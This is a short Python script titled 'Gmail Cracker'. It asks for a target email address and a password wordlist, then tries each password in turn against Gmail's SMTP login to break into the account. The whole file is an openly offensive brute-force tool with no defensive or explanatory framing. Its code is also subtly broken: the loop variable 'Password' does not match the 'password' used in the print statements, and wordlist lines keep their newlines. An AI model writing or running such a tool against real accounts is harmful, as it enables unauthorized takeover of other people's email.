import smtplib
import os 
os.system("clear")
os.system("figlet Gmail Cracker | lolcat ")


Email = raw_input("Enter Your Target Email Address => ")
passwfile = raw_input("\nEnter Your Target Password Address => ")
passwfile = open(passwfile, "r")

def crack():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    for Password in passwfile:
        try:
            smtpserver.login(Email, Password)
            print("\nYour Email Password Was Successfully Found , Password => %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("\nThe Password Does Not Match The Email You Want , Password => %s" % password)

crack()
